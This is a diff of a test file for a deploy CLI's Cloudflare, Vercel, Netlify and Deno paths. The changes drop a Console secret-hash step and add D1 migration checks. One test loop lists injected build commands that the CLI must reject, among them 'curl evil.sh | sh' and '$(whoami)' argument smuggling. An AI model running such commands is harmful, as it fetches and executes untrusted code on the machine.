@@ -1,11 +1,11 @@
 import { execFileSync } from "node:child_process"
 import { existsSync } from "node:fs"
-import { readFile, writeFile } from "node:fs/promises"
-import { delimiter, join } from "node:path"
+import { mkdir, readFile, writeFile } from "node:fs/promises"
+import { delimiter, dirname, join } from "node:path"
 
 import { describe, expect, it } from "vitest"
 
-import { buildOutput, builtProject, consoleLink, expectNoLeak, fakeHosts, HASH, PENDING_ID } from "./setup-deploy-helpers.ts"
+import { buildOutput, builtProject, expectNoLeak, fakeHosts } from "./setup-deploy-helpers.ts"
 import { createProject, runSetup } from "./setup-helpers.ts"
 
 import type { ViteHubCliSpawn } from "@vite-hub/internal/cli"
@@ -19,6 +19,7 @@ const vercelEnv = { VERCEL_TEAM_ID: "team_1", VERCEL_TOKEN: "vercel-token-1" }
 const netlifyEnv = { NETLIFY_AUTH_TOKEN: "netlify-token-1" }
 const denoEnv = { DENO_DEPLOY_ORG: "acme", DENO_DEPLOY_TOKEN: "deno-token-1" }
 const tokens = ["cf-token-1", "vercel-token-1", "netlify-token-1", "deno-token-1"]
+const noEnv = { checked: [], missing: [], pushed: [], stage: "production" }
 
 function deploy(args: string[], root: string, env: NodeJS.ProcessEnv, options: { fetch?: typeof fetch, runHostCli?: HostCliRun, spawn?: ViteHubCliSpawn } = {}) {
   return runSetup<DeployJson>(["deploy", ...args, "--json"], root, env, options)
@@ -28,41 +29,51 @@ async function readLink(root: string): Promise<Record<string, unknown>> {
   return JSON.parse(await readFile(join(root, ".vitehub/link.json"), "utf8")) as Record<string, unknown>
 }
 
-const linkUrl = (origin: string) => `https://console.vitehub.dev/link#p=${PENDING_ID}&url=${encodeURIComponent(origin)}`
-
 describe("vitehub deploy on Cloudflare", () => {
-  it("puts the Console hash over stdin, checks it, then runs the deploy that the build wrote", async () => {
-    const root = await builtProject("cloudflare", consoleLink())
+  it("runs the deploy that the build wrote, and records the host project", async () => {
+    const root = await builtProject("cloudflare")
     const hosts = await fakeHosts(cloudflareEnv)
     const result = await deploy(["--no-build", "--yes"], root, hosts.env)
 
     expect(result.exitCode, result.stdout + result.stderr).toBe(0)
     const calls = await hosts.calls()
     expect(calls.map(call => [call.name, call.argv, call.stdin])).toEqual([
-      ["wrangler", ["secret", "put", "VITEHUB_CONSOLE_TOKEN_SHA256", "--config", "./server/wrangler.json"], HASH],
-      ["wrangler", ["secret", "list", "--config", "./server/wrangler.json", "--format", "json"], ""],
-      ["wrangler", ["deploy", "--config", "./server/wrangler.json"], ""],
+      ["wrangler", ["deploy", "--config", "./server/wrangler.json", "--keep-vars"], ""],
     ])
     expect(calls.every(call => call.cwd === join(root, ".output"))).toBe(true)
     expect(result.json).toEqual({
-      console: { linkUrl: linkUrl("https://my-app.example.workers.dev"), secret: "set" },
+      env: noEnv,
       host: "cloudflare",
       schemaVersion: 1,
       url: "https://my-app.example.workers.dev",
       version: "version-1",
     })
-    expectNoLeak(calls, result.stdout + result.stderr, [HASH, ...tokens])
-    // The first deploy records the host project. The pending Console link stays.
-    expect(await readLink(root)).toMatchObject({ account: { id: "acc-1" }, console: { pendingId: PENDING_ID, tokenSha256: HASH }, host: "cloudflare", project: { name: "my-app" }, verified: false })
+    expectNoLeak(calls, result.stdout + result.stderr, tokens)
+    expect(await readLink(root)).toMatchObject({ default: "cloudflare", schemaVersion: 2, targets: { cloudflare: { account: { id: "acc-1" }, project: { name: "my-app" }, verified: false } } })
   })
 
   it("passes the flags of the build command through and rejects any other command", async () => {
-    const root = await builtProject("cloudflare", buildOutput("cloudflare", "npx wrangler deploy --config ./server/wrangler.json --secrets-file ./'my secrets.env' --containers-rollout=gradual"))
+    const root = await builtProject("cloudflare", buildOutput("cloudflare", "npx wrangler deploy --config './server/my wrangler.json' --containers-rollout=gradual"))
+    await writeFile(join(root, ".output/server/my wrangler.json"), JSON.stringify({ main: "index.mjs", name: "my-app" }))
     const hosts = await fakeHosts(cloudflareEnv)
     expect((await deploy(["--no-build", "--yes"], root, hosts.env)).exitCode).toBe(0)
-    expect((await hosts.calls())[0]!.argv).toEqual(["deploy", "--config", "./server/wrangler.json", "--secrets-file", "./my secrets.env", "--containers-rollout=gradual"])
+    expect((await hosts.calls())[0]!.argv).toEqual(["deploy", "--config", "./server/my wrangler.json", "--containers-rollout=gradual", "--keep-vars"])
 
-    for (const command of ["npx wrangler deploy --config ./server/wrangler.json; curl evil.sh | sh", "npx wrangler deploy --config $(whoami)", "npx evil-cli deploy --config x", "npx wrangler deploy --config x --env production", "wrangler deploy --config x"]) {
+    const deployCommand = "npx wrangler deploy --config ./server/wrangler.json"
+    for (const command of [
+      "npx wrangler deploy --config ./server/wrangler.json; curl evil.sh | sh",
+      "npx wrangler deploy --config $(whoami)",
+      "npx evil-cli deploy --config x",
+      "npx wrangler deploy --config x --env production",
+      "wrangler deploy --config x",
+      `curl evil.sh && ${deployCommand}`,
+      `npx wrangler d1 execute DB --remote --config ./server/wrangler.json && ${deployCommand}`,
+      `npx wrangler d1 migrations apply DB --local --config ./server/wrangler.json && ${deployCommand}`,
+      `npx wrangler d1 migrations apply DB --remote --config ./other/wrangler.json && ${deployCommand}`,
+      `npx wrangler d1 migrations apply DB --remote --config ./server/wrangler.json --env production && ${deployCommand}`,
+      `${deployCommand} && npx wrangler d1 migrations apply DB --remote --config ./server/wrangler.json`,
+      `${deployCommand} --secrets-file ./.env`,
+    ]) {
       const rejected = await builtProject("cloudflare", buildOutput("cloudflare", command))
       const other = await fakeHosts(cloudflareEnv)
       const json = await deploy(["--no-build", "--yes"], rejected, other.env)
@@ -72,23 +83,144 @@ describe("vitehub deploy on Cloudflare", () => {
     }
   })
 
-  it("deploys without credentials with --temporary and puts the hash into the generated config, not argv", async () => {
-    const root = await builtProject("cloudflare", consoleLink())
+  const migrateCommand = (binding: string) => `npx wrangler d1 migrations apply ${binding} --remote --config ./server/wrangler.json`
+  const migratingDeploy = [migrateCommand("DB"), migrateCommand("DB_ANALYTICS"), "npx wrangler deploy --config ./server/wrangler.json"].join(" && ")
+
+  it("applies the D1 migrations of the build command before it deploys", async () => {
+    const root = await builtProject("cloudflare", buildOutput("cloudflare", migratingDeploy))
+    const hosts = await fakeHosts(cloudflareEnv)
+    const result = await deploy(["--no-build", "--yes"], root, hosts.env)
+
+    expect(result.exitCode, result.stdout + result.stderr).toBe(0)
+    const calls = await hosts.calls()
+    expect(calls.map(call => call.argv)).toEqual([
+      ["d1", "migrations", "apply", "DB", "--remote", "--config", "./server/wrangler.json"],
+      ["d1", "migrations", "apply", "DB_ANALYTICS", "--remote", "--config", "./server/wrangler.json"],
+      ["deploy", "--config", "./server/wrangler.json", "--keep-vars"],
+    ])
+    expect(calls.every(call => call.cwd === join(root, ".output") && call.accountId === "acc-1")).toBe(true)
+    expectNoLeak(calls, result.stdout + result.stderr, tokens)
+  })
+
+  it("does not deploy when a D1 migration fails", async () => {
+    const root = await builtProject("cloudflare", buildOutput("cloudflare", migratingDeploy))
+    const hosts = await fakeHosts({ ...cloudflareEnv, FAKE_HOST_FAIL: "wrangler d1 migrations" })
+    const result = await deploy(["--no-build", "--yes"], root, hosts.env)
+
+    expect(result.exitCode).toBe(1)
+    expect(result.json.error?.code).toBe("SETUP_DEPLOY_FAILED")
+    expect(result.json.error?.why).toContain("wrangler d1 migrations apply DB")
+    expect((await hosts.calls()).map(call => call.argv[0])).toEqual(["d1"])
+    expect((await hosts.state()).deploys).toBe(0)
+  })
+
+  it("does not apply D1 migrations for a preview version", async () => {
+    const root = await builtProject("cloudflare", buildOutput("cloudflare", migratingDeploy))
+    const hosts = await fakeHosts(cloudflareEnv)
+    const result = await deploy(["--no-build", "--yes", "--preview"], root, hosts.env)
+
+    expect(result.exitCode, result.stderr).toBe(0)
+    expect((await hosts.calls()).map(call => call.argv)).toEqual([["versions", "upload", "--config", "./server/wrangler.json", "--keep-vars"]])
+  })
+
+  // The output of a build without `migrateOnDeploy`: the D1 migrations are in the server output, and nothing applies them.
+  const d1Output = (migrations: Record<string, string[]>, deployCommand?: string) => ({
+    ...buildOutput("cloudflare", deployCommand),
+    ".output/server/wrangler.json": JSON.stringify({
+      d1_databases: Object.keys(migrations).map(binding => ({ binding, database_id: `id-${binding}`, migrations_dir: `.vitehub/database/migrations/${binding}` })),
+      main: "index.mjs",
+      name: "my-app",
+    }),
+    ...Object.fromEntries(Object.entries(migrations).flatMap(([binding, files]) => files.map(file => [`.output/server/.vitehub/database/migrations/${binding}/${file}`, "CREATE TABLE t (id INTEGER);\n"]))),
+  })
+  const ledgerQuery = (binding: string, sql: string) => ["d1", "execute", binding, "--remote", "--config", "./server/wrangler.json", "--json", "--command", sql]
+
+  it("stops before it deploys when the remote D1 database has not applied a migration of the build", async () => {
+    const root = await builtProject("cloudflare", d1Output({ DB: ["0001_init.sql", "0002_draft_images.sql"] }))
+    const hosts = await fakeHosts({ ...cloudflareEnv, FAKE_D1_APPLIED: JSON.stringify({ DB: ["0001_init.sql"] }) })
+    const result = await deploy(["--no-build", "--yes"], root, hosts.env)
+
+    expect(result.exitCode).toBe(1)
+    expect(result.json.error?.code).toBe("SETUP_DEPLOY_D1_MIGRATIONS_PENDING")
+    expect(result.json.error?.why).toContain("binding DB")
+    expect(result.json.error?.why).toContain(": 0002_draft_images.sql.")
+    expect(result.json.error?.fix).toContain("npx wrangler d1 migrations apply DB --remote --config ./server/wrangler.json")
+    expect((await hosts.calls()).map(call => call.argv)).toEqual([
+      ledgerQuery("DB", "SELECT name FROM sqlite_master WHERE type = 'table' AND name = 'd1_migrations'"),
+      ledgerQuery("DB", `SELECT name FROM "d1_migrations"`),
+    ])
+    expect((await hosts.state()).deploys).toBe(0)
+  })
+
+  it("counts every migration as pending when the D1 database has no migrations table", async () => {
+    const root = await builtProject("cloudflare", d1Output({ DB: ["0001_init.sql"] }))
+    const hosts = await fakeHosts(cloudflareEnv)
+    const result = await deploy(["--no-build", "--yes"], root, hosts.env)
+
+    expect(result.json.error?.code).toBe("SETUP_DEPLOY_D1_MIGRATIONS_PENDING")
+    expect(result.json.error?.why).toContain(": 0001_init.sql.")
+    expect(await hosts.calls()).toHaveLength(1)
+    expect((await hosts.state()).deploys).toBe(0)
+  })
+
+  it("checks only the D1 bindings in the selected Wrangler environment", async () => {
+    const config = "./server dir/wrangler.json"
+    const output = buildOutput("cloudflare", `npx wrangler deploy --config '${config}'`)
+    const root = await builtProject("cloudflare", {
+      ...output,
+      ".output/server dir/wrangler.json": JSON.stringify({
+        d1_databases: [{ binding: "DB_DEFAULT", migrations_dir: "migrations" }],
+        env: { production: { d1_databases: [{ binding: "DB", migrations_dir: "migrations", migrations_table: "prod_migrations" }] } },
+      }),
+      ".output/server dir/migrations/0001_init.sql": "CREATE TABLE t (id INTEGER);\n",
+    })
+    const hosts = await fakeHosts({ ...cloudflareEnv, CLOUDFLARE_ENV: "production", FAKE_D1_APPLIED: JSON.stringify({ DB: [] }) })
+    const result = await deploy(["--no-build", "--yes"], root, hosts.env)
+
+    expect(result.json.error?.code).toBe("SETUP_DEPLOY_D1_MIGRATIONS_PENDING")
+    expect(result.json.error?.fix).toContain(`npx wrangler d1 migrations apply DB --remote --config '${config}' --env production`)
+    expect((await hosts.calls()).map(call => call.argv)).toEqual([
+      ["d1", "execute", "DB", "--remote", "--config", config, "--json", "--command", "SELECT name FROM sqlite_master WHERE type = 'table' AND name = 'prod_migrations'"],
+      ["d1", "execute", "DB", "--remote", "--config", config, "--json", "--command", 'SELECT name FROM "prod_migrations"'],
+    ])
+    expect((await hosts.state()).deploys).toBe(0)
+  })
+
+  it("deploys with quiet Wrangler logging when D1 has applied every migration of the build", async () => {
+    const root = await builtProject("cloudflare", d1Output({ DB: ["0001_init.sql", "0002_draft_images.sql"] }))
+    const hosts = await fakeHosts({ ...cloudflareEnv, WRANGLER_LOG: "error", FAKE_D1_APPLIED: JSON.stringify({ DB: ["0001_init.sql", "0002_draft_images.sql"] }) })
+    const result = await deploy(["--no-build", "--yes"], root, hosts.env)
+
+    expect(result.exitCode, result.stdout + result.stderr).toBe(0)
+    expect((await hosts.calls()).map(call => call.argv[1])).toEqual(["execute", "execute", "--config"])
+    expect((await hosts.state()).deploys).toBe(1)
+  })
+
+  it("does not read the migrations table of a binding that the build command migrates, or for a preview version", async () => {
+    const migrated = await builtProject("cloudflare", d1Output({ DB: ["0001_init.sql"] }, [migrateCommand("DB"), "npx wrangler deploy --config ./server/wrangler.json"].join(" && ")))
+    const hosts = await fakeHosts(cloudflareEnv)
+    expect((await deploy(["--no-build", "--yes"], migrated, hosts.env)).exitCode).toBe(0)
+    expect((await hosts.calls()).map(call => call.argv.slice(0, 3))).toEqual([["d1", "migrations", "apply"], ["deploy", "--config", "./server/wrangler.json"]])
+
+    const preview = await builtProject("cloudflare", d1Output({ DB: ["0001_init.sql"] }))
+    const other = await fakeHosts(cloudflareEnv)
+    expect((await deploy(["--no-build", "--yes", "--preview"], preview, other.env)).exitCode).toBe(0)
+    expect((await other.calls()).map(call => call.argv[0])).toEqual(["versions"])
+  })
+
+  it("deploys without credentials with --temporary", async () => {
+    const root = await builtProject("cloudflare")
     const hosts = await fakeHosts()
     const result = await deploy(["--no-build", "--yes", "--temporary"], root, hosts.env)
 
     expect(result.exitCode, result.stdout + result.stderr).toBe(0)
     const calls = await hosts.calls()
-    expect(calls.map(call => call.argv)).toEqual([["deploy", "--config", "./server/wrangler.json", "--temporary"]])
-    expect(calls[0]!.generated).toMatchObject({ vars: { VITEHUB_CONSOLE_TOKEN_SHA256: HASH } })
+    expect(calls.map(call => call.argv)).toEqual([["deploy", "--config", "./server/wrangler.json", "--keep-vars", "--temporary"]])
     expect(await readFile(join(root, ".output/server/wrangler.json"), "utf8")).toBe(buildOutput("cloudflare")[".output/server/wrangler.json"])
-    expect(result.json).toMatchObject({ console: { secret: "var" }, temporary: { claimUrl: "https://dash.cloudflare.com/claim/abc123" } })
+    expect(result.json).toMatchObject({ temporary: { claimUrl: "https://dash.cloudflare.com/claim/abc123" } })
     expect(Date.parse(result.json.temporary!.expiresAt!) - Date.now()).toBeGreaterThan(55 * 60_000)
-    // Wrangler prints plain vars in its bindings table. The shown output is redacted.
-    expect(result.stderr).toContain("env.VITEHUB_CONSOLE_TOKEN_SHA256 (\"<redacted>\")")
-    expectNoLeak(calls, result.stdout + result.stderr)
-    // A temporary Worker belongs to a temporary account, so the link file keeps no host link.
-    expect(await readLink(root)).toEqual({ console: { pendingId: PENDING_ID, tokenSha256: HASH }, schemaVersion: 1 })
+    expectNoLeak(calls, result.stdout + result.stderr, tokens)
+    expect(existsSync(join(root, ".vitehub/link.json"))).toBe(false)
 
     const text = await runSetup(["deploy", "--no-build", "--yes", "--temporary"], root, (await fakeHosts()).env)
     expect(text.stdout).toContain("Claim it within 60 minutes")
@@ -115,32 +247,12 @@ describe("vitehub deploy on Cloudflare", () => {
     expect(result.json.error?.code).toBe("SETUP_DEPLOY_TEMPORARY_UNSUPPORTED")
   })
 
-  it("exits 1 and does not deploy when the host does not list the secret", async () => {
-    const root = await builtProject("cloudflare", consoleLink())
-    const hosts = await fakeHosts({ ...cloudflareEnv, FAKE_HOST_FAIL: "wrangler secret list" })
-    const result = await deploy(["--no-build", "--yes"], root, hosts.env)
-
-    expect(result.exitCode).toBe(1)
-    expect(result.json.error?.code).toBe("SETUP_DEPLOY_SECRET_UNVERIFIED")
-    expect((await hosts.calls()).map(call => call.argv[0])).toEqual(["secret", "secret"])
-    expectNoLeak(await hosts.calls(), result.stdout + result.stderr)
-  })
-
-  it("reports a failed secret put without the value", async () => {
-    const root = await builtProject("cloudflare", consoleLink())
-    const hosts = await fakeHosts({ ...cloudflareEnv, FAKE_HOST_FAIL: "wrangler secret put" })
-    const result = await runSetup(["deploy", "--no-build", "--yes"], root, hosts.env)
-    expect(result.exitCode).toBe(1)
-    expect(result.stderr).toContain("wrangler secret put VITEHUB_CONSOLE_TOKEN_SHA256")
-    expectNoLeak(await hosts.calls(), result.stdout + result.stderr)
-  })
-
   it("uploads a preview version with --preview", async () => {
     const root = await builtProject("cloudflare", buildOutput("cloudflare", "npx wrangler deploy --config ./server/wrangler.json --containers-rollout=gradual"))
     const hosts = await fakeHosts(cloudflareEnv)
     const result = await deploy(["--no-build", "--yes", "--preview"], root, hosts.env)
     expect(result.exitCode, result.stderr).toBe(0)
-    expect((await hosts.calls())[0]!.argv).toEqual(["versions", "upload", "--config", "./server/wrangler.json"])
+    expect((await hosts.calls())[0]!.argv).toEqual(["versions", "upload", "--config", "./server/wrangler.json", "--keep-vars"])
     expect(result.json.url).toBe("https://v1-my-app.example.workers.dev")
   })
 
@@ -156,7 +268,7 @@ describe("vitehub deploy on Cloudflare", () => {
     const clean = await deploy(["--no-build", "--yes"], root, hosts.env)
     expect(clean.exitCode, clean.stderr).toBe(0)
     expect(clean.json.commit).toEqual({ dirty: false, sha })
-    expect((await hosts.calls())[0]!.argv).toEqual(["deploy", "--config", "./server/wrangler.json", "--tag", sha.slice(0, 12), "--message", `vitehub:{"commit":"${sha}","dirty":false}`])
+    expect((await hosts.calls())[0]!.argv).toEqual(["deploy", "--config", "./server/wrangler.json", "--keep-vars", "--tag", sha.slice(0, 12), "--message", `vitehub:{"commit":"${sha}","dirty":false}`])
 
     await writeFile(join(root, "changed.txt"), "x")
     const dirty = await deploy(["--no-build", "--yes"], root, hosts.env)
@@ -172,11 +284,8 @@ describe("vitehub deploy on Cloudflare", () => {
 })
 
 describe("vitehub deploy on Vercel", () => {
-  it.each([false, true])("uses a saved CLI login for deploy and Console setup (linked: %s)", async (linked) => {
-    const root = await builtProject("vercel", {
-      ...consoleLink(),
-      ...(linked ? { ".vitehub/link.json": JSON.stringify({ account: { id: "team_1" }, console: { pendingId: PENDING_ID, tokenSha256: HASH }, host: "vercel", linkedAt: "", project: { id: "prj_1", name: "shop" }, schemaVersion: 1, verified: true }) } : {}),
-    })
+  it.each([false, true])("uses a saved CLI login for deploy (linked: %s)", async (linked) => {
+    const root = await builtProject("vercel", linked ? { ".vitehub/link.json": JSON.stringify({ account: { id: "team_1" }, host: "vercel", linkedAt: "", project: { id: "prj_1", name: "shop" }, schemaVersion: 1, verified: true }) } : {})
     const hosts = await fakeHosts({ VERCEL_TEAM_ID: linked ? "other-team" : "team_1" })
     const probes: string[][] = []
     const runHostCli: HostCliRun = async (command, args, options) => {
@@ -191,72 +300,59 @@ describe("vitehub deploy on Vercel", () => {
     expect(probes[0]!.at(-1)).toBe("whoami")
     expect(probes[0]).toContain(join(hosts.env.PATH!.split(delimiter)[0]!, "vercel"))
     const calls = await hosts.calls()
-    expect(calls.map(call => call.argv.slice(0, 2))).toEqual(linked
-      ? [["env", "add"], ["env", "ls"], ["deploy", "--prebuilt"]]
-      : [["deploy", "--prebuilt"], ["env", "add"], ["env", "ls"], ["deploy", "--prebuilt"]])
+    expect(calls.map(call => call.argv.slice(0, 2))).toEqual([["deploy", "--prebuilt"]])
     for (const call of calls) {
       expect(call.argv).toEqual(expect.arrayContaining(["--project", linked ? "prj_1" : "my-app", "--scope", "team_1"]))
     }
-    expect(result.json.console?.secret).toBe("set")
-    expectNoLeak(calls, result.stdout + result.stderr, [HASH, ...tokens])
+    expectNoLeak(calls, result.stdout + result.stderr, tokens)
   })
 
-  it("creates the project with a first deploy, adds the secret over stdin, then deploys again", async () => {
-    const root = await builtProject("vercel", consoleLink())
+  it("creates the project with the deploy", async () => {
+    const root = await builtProject("vercel")
     const hosts = await fakeHosts(vercelEnv)
     const result = await deploy(["--no-build", "--yes"], root, hosts.env)
 
     expect(result.exitCode, result.stdout + result.stderr).toBe(0)
     const project = ["--project", "my-app", "--scope", "team_1"]
-    const deployArgs = ["deploy", "--prebuilt", "--yes", "--json", "--prod", ...project, "--create-if-missing"]
     expect((await hosts.calls()).map(call => [call.argv, call.stdin])).toEqual([
-      [deployArgs, ""],
-      [["env", "add", "VITEHUB_CONSOLE_TOKEN_SHA256", "--environment", "production", "--sensitive", "--force", "--yes", ...project], HASH],
-      [["env", "ls", "--environment", "production", "--json", ...project], ""],
-      [deployArgs, ""],
+      [["deploy", "--prebuilt", "--yes", "--json", "--prod", ...project, "--create-if-missing"], ""],
     ])
     expect(result.json).toEqual({
-      console: { linkUrl: linkUrl("https://my-app.vercel.app"), secret: "set" },
-      deploymentId: "dpl_2",
+      deploymentId: "dpl_1",
+      env: noEnv,
       host: "vercel",
       schemaVersion: 1,
       url: "https://my-app.vercel.app",
     })
-    expectNoLeak(await hosts.calls(), result.stdout + result.stderr, [HASH, ...tokens])
+    expectNoLeak(await hosts.calls(), result.stdout + result.stderr, tokens)
   })
 
-  it.each([{}, { VERCEL_TEAM_ID: "other-team" }, { VERCEL_ORG_ID: "other-team" }])("uses the verified linked project and team for secrets and deploy, with credential metadata %j", async (teamEnv) => {
+  it.each([{}, { VERCEL_TEAM_ID: "other-team" }, { VERCEL_ORG_ID: "other-team" }])("uses the verified linked project and team for the deploy, with credential metadata %j", async (teamEnv) => {
     const root = await builtProject("vercel", {
-      ".vitehub/link.json": JSON.stringify({ account: { id: "team_1" }, console: { pendingId: PENDING_ID, tokenSha256: HASH }, host: "vercel", linkedAt: "", project: { id: "prj_1", name: "shop" }, schemaVersion: 1, verified: true }),
+      ".vitehub/link.json": JSON.stringify({ account: { id: "team_1" }, host: "vercel", linkedAt: "", project: { id: "prj_1", name: "shop" }, schemaVersion: 1, verified: true }),
     })
     const sha = "0123456789abcdef0123456789abcdef01234567"
     const hosts = await fakeHosts({ VERCEL_TOKEN: "vercel-token-1", ...teamEnv })
-    // A fake git on PATH answers for the repository.
     await writeFile(join(hosts.env.PATH!.split(":")[0]!, "git"), `#!/bin/sh\n[ "$1" = rev-parse ] && echo ${sha}\nexit 0\n`, { mode: 0o755 })
     const result = await deploy(["--no-build", "--yes"], root, hosts.env)
 
     expect(result.exitCode, result.stderr).toBe(0)
     const calls = await hosts.calls()
-    expect(calls.map(call => call.argv.slice(0, 2))).toEqual([["env", "add"], ["env", "ls"], ["deploy", "--prebuilt"]])
-    for (const call of calls) {
-      expect(call.argv.slice(call.argv.indexOf("--scope"), call.argv.indexOf("--scope") + 2)).toEqual(["--scope", "team_1"])
-    }
-    expect(calls[2]!.argv).toEqual(["deploy", "--prebuilt", "--yes", "--json", "--prod", "--project", "prj_1", "--scope", "team_1", "--create-if-missing", "--meta", `vitehubCommit=${sha}`, "--meta", "vitehubDirty=false"])
-    expectNoLeak(calls, result.stdout + result.stderr, [HASH, ...tokens])
+    expect(calls.map(call => call.argv.slice(0, 2))).toEqual([["deploy", "--prebuilt"]])
+    expect(calls[0]!.argv).toEqual(["deploy", "--prebuilt", "--yes", "--json", "--prod", "--project", "prj_1", "--scope", "team_1", "--create-if-missing", "--meta", `vitehubCommit=${sha}`, "--meta", "vitehubDirty=false"])
+    expectNoLeak(calls, result.stdout + result.stderr, tokens)
   })
 
-  it("deploys with --temporary and puts the hash into the function config, not argv", async () => {
-    const root = await builtProject("vercel", consoleLink())
+  it("deploys with --temporary", async () => {
+    const root = await builtProject("vercel")
     const hosts = await fakeHosts()
     const result = await deploy(["--no-build", "--yes", "--temporary"], root, hosts.env)
 
     expect(result.exitCode, result.stdout + result.stderr).toBe(0)
     expect((await hosts.calls()).map(call => call.argv)).toEqual([["deploy", "--prebuilt", "--yes", "--json", "--prod", "--temporary"]])
-    expect((await hosts.calls())[0]!.generated).toMatchObject({ environment: { VITEHUB_CONSOLE_TOKEN_SHA256: HASH } })
     expect(await readFile(join(root, ".vercel/output/functions/__server.func/.vc-config.json"), "utf8")).toBe(buildOutput("vercel")[".vercel/output/functions/__server.func/.vc-config.json"])
-    expect(result.json).toMatchObject({ console: { secret: "var" }, temporary: { claimUrl: "https://vercel.com/claim/xyz", expiresAt: "2026-11-07T00:00:00.000Z" } })
-    // The anonymous token in .vercel/anonymous.json stays there.
-    expectNoLeak(await hosts.calls(), result.stdout + result.stderr, [HASH, "anonymous-token"])
+    expect(result.json).toMatchObject({ temporary: { claimUrl: "https://vercel.com/claim/xyz", expiresAt: "2026-11-07T00:00:00.000Z" } })
+    expectNoLeak(await hosts.calls(), result.stdout + result.stderr, ["anonymous-token"])
   })
 
   it("refuses --temporary in a linked folder and in CI", async () => {
@@ -274,72 +370,32 @@ describe("vitehub deploy on Vercel", () => {
   })
 })
 
-interface NetlifyRequest {
-  method: string
-  url: string
-  body: unknown
-}
-
-function netlifyApi(): { fetch: typeof fetch, requests: NetlifyRequest[] } {
-  const requests: NetlifyRequest[] = []
-  let variable: unknown
-  const fakeFetch = async (input: string | URL | Request, init?: RequestInit): Promise<Response> => {
-    const url = new URL(String(input))
-    const method = init?.method ?? "GET"
-    const body: unknown = init?.body ? JSON.parse(String(init.body)) : undefined
-    requests.push({ body, method, url: url.href })
-    const json = (value: unknown, status = 200) => new Response(JSON.stringify(value), { headers: { "content-type": "application/json" }, status })
-    if (method === "GET" && url.pathname === "/api/v1/sites/site-1") return json({ account_id: "acct-1", id: "site-1", name: "my-app" })
-    if (url.pathname === "/api/v1/accounts/acct-1/env/VITEHUB_CONSOLE_TOKEN_SHA256" && method === "GET") return variable ? json(variable) : json({ message: "Not Found" }, 404)
-    if (url.pathname === "/api/v1/accounts/acct-1/env" && method === "POST" && Array.isArray(body)) {
-      variable = { ...body[0], values: [] }
-      return json(body, 201)
-    }
-    throw new Error(`unexpected request ${method} ${url.href}`)
-  }
-  return { fetch: fakeFetch, requests }
-}
-
 describe("vitehub deploy on Netlify", () => {
-  it("uses the deploy-preview context that receives the Console hash", async () => {
-    const root = await builtProject("netlify", consoleLink())
+  it("deploys a draft with --preview", async () => {
+    const root = await builtProject("netlify")
     const hosts = await fakeHosts(netlifyEnv)
-    const api = netlifyApi()
-    const result = await deploy(["--no-build", "--yes", "--preview"], root, hosts.env, { fetch: api.fetch })
+    const result = await deploy(["--no-build", "--yes", "--preview"], root, hosts.env)
 
     expect(result.exitCode, result.stdout + result.stderr).toBe(0)
     expect((await hosts.calls()).map(call => call.argv)).toEqual([
       ["deploy", "--no-build", "--dir", "dist", "--json", "--context", "deploy-preview", "--site-name", "my-app"],
-      ["deploy", "--no-build", "--dir", "dist", "--json", "--context", "deploy-preview", "--site", "site-1"],
     ])
-    expect(api.requests[2]!.body).toEqual([{ is_secret: true, key: "VITEHUB_CONSOLE_TOKEN_SHA256", scopes: ["functions"], values: [{ context: "production", value: HASH }, { context: "deploy-preview", value: HASH }] }])
-    for (const request of api.requests) expect(request.url).not.toContain(HASH)
-    expect(result.json).toMatchObject({ console: { linkUrl: linkUrl("https://deploy--my-app.netlify.app"), secret: "set" }, url: "https://deploy--my-app.netlify.app" })
-    expectNoLeak(await hosts.calls(), result.stdout + result.stderr, [HASH, ...tokens])
+    expect(result.json).toMatchObject({ url: "https://deploy--my-app.netlify.app" })
+    expectNoLeak(await hosts.calls(), result.stdout + result.stderr, tokens)
   })
 
-  it("deploys, sets the secret in a JSON request body, and deploys again to the site", async () => {
-    const root = await builtProject("netlify", consoleLink())
+  it("deploys to production and records the site", async () => {
+    const root = await builtProject("netlify")
     const hosts = await fakeHosts(netlifyEnv)
-    const api = netlifyApi()
-    const result = await deploy(["--no-build", "--yes"], root, hosts.env, { fetch: api.fetch })
+    const result = await deploy(["--no-build", "--yes"], root, hosts.env)
 
     expect(result.exitCode, result.stdout + result.stderr).toBe(0)
     expect((await hosts.calls()).map(call => call.argv)).toEqual([
       ["deploy", "--no-build", "--dir", "dist", "--json", "--prod", "--site-name", "my-app"],
-      ["deploy", "--no-build", "--dir", "dist", "--json", "--prod", "--site", "site-1"],
     ])
-    expect(api.requests.map(request => `${request.method} ${request.url}`)).toEqual([
-      "GET https://api.netlify.com/api/v1/sites/site-1",
-      "GET https://api.netlify.com/api/v1/accounts/acct-1/env/VITEHUB_CONSOLE_TOKEN_SHA256?site_id=site-1",
-      "POST https://api.netlify.com/api/v1/accounts/acct-1/env?site_id=site-1",
-      "GET https://api.netlify.com/api/v1/accounts/acct-1/env/VITEHUB_CONSOLE_TOKEN_SHA256?site_id=site-1",
-    ])
-    expect(api.requests[2]!.body).toEqual([{ is_secret: true, key: "VITEHUB_CONSOLE_TOKEN_SHA256", scopes: ["functions"], values: [{ context: "production", value: HASH }, { context: "deploy-preview", value: HASH }] }])
-    for (const request of api.requests) expect(request.url).not.toContain(HASH)
-    expect(result.json).toEqual({ console: { linkUrl: linkUrl("https://my-app.netlify.app"), secret: "set" }, deploymentId: "deploy-2", host: "netlify", schemaVersion: 1, url: "https://my-app.netlify.app" })
-    expectNoLeak(await hosts.calls(), result.stdout + result.stderr, [HASH, ...tokens])
-    expect(await readLink(root)).toMatchObject({ account: { id: "acct-1" }, host: "netlify", project: { id: "site-1", name: "my-app" }, verified: false })
+    expect(result.json).toEqual({ deploymentId: "deploy-1", env: noEnv, host: "netlify", schemaVersion: 1, url: "https://my-app.netlify.app" })
+    expectNoLeak(await hosts.calls(), result.stdout + result.stderr, tokens)
+    expect(await readLink(root)).toMatchObject({ default: "netlify", targets: { netlify: { project: { id: "site-1", name: "my-app" }, verified: false } } })
   })
 
   it("has no temporary deploy", async () => {
@@ -359,38 +415,31 @@ describe("vitehub deploy on Netlify", () => {
 describe("vitehub deploy on Deno", () => {
   it.each([undefined, "other-org"])("uses the linked organization and app when DENO_DEPLOY_ORG is %s", async (organization) => {
     const root = await builtProject("deno", {
-      ".vitehub/link.json": JSON.stringify({ account: { id: "linked-org" }, console: { pendingId: PENDING_ID, tokenSha256: HASH }, host: "deno", linkedAt: "", project: { name: "linked-app" }, schemaVersion: 1, verified: true }),
+      ".vitehub/link.json": JSON.stringify({ account: { id: "linked-org" }, host: "deno", linkedAt: "", project: { name: "linked-app" }, schemaVersion: 1, verified: true }),
     })
